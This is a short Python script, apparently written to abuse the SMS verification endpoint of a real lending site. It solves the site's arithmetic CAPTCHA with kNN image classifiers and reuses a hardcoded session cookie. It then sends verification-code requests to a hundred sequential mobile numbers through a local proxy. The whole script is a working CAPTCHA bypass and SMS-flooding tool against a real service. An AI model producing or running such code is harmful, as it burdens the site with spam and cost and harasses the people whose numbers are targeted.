import requests

from image.images import get_verification_value
from image.kNN import test_num
from image.kNN_symbol import test_symbol

proxies = {
    "http": "http://127.0.0.1:10800",
    "https": "http://127.0.0.1:10800",
}

cookie = 'isGuifan=1; PHPSESSID=pi4phlfih5791slqb9njn8div3'


def send_code(mobile):
    # 通过HTTP请求获取验证码信息
    value = get_verification_value(cookie)

    first = test_num(value[0])
    second = test_num(value[1])

    # 0为加；1为减；2为乘
    symbol = test_symbol(value[2])

    result = 0
    if symbol == '0':
        result = int(first) + int(second)
    elif symbol == '1':
        result = int(first) - int(second)
    elif symbol == '2':
        result = int(first) * int(second)

    # print(first + second + symbol)
    # print(result)

    url = 'https://www.woshidai.com/?app=sms&act=send'
    headers = {
        'Cookie': cookie
    }
    data = {
        'mobile': mobile,
        'vcode': result
    }
    print(mobile)
    r = requests.post(url, headers=headers, data=data, proxies=proxies)
    print(r.content.decode('gbk'))


for i in range(10):
    for j in range(10):
        try:
            send_code(int('135125105' + str(i) + str(j)))
        except Exception as e:
            print(e)
